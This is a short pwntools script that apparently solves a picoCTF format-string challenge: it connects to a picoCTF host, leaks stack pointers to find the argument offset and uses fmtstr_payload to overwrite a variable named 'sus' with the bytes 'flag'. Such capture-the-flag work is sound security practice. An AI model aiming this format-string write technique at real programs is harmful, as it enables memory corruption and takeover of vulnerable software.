from pwn import *

exe = context.binary = ELF('./vuln', checksec=False)

target_addr = exe.symbols.sus
value_to_write = 0x67616c66

conn = remote('rhea.picoctf.net', 62587)

# Calculate argument offset
def find_offset():
   payload=b"AAAA"
   payload += b'%p.' * 20  # print 20 pointers from stack
   print(conn.recvline())
   conn.sendline(payload)
   print(conn.recvline())

def send_payload():
   
   offset = 14

   payload = fmtstr_payload(offset, {target_addr: value_to_write},write_size='byte')
   print(payload)

   print(conn.recvline())
   conn.sendline(payload)
   print(conn.recvall())
   

send_payload()
# find_offset()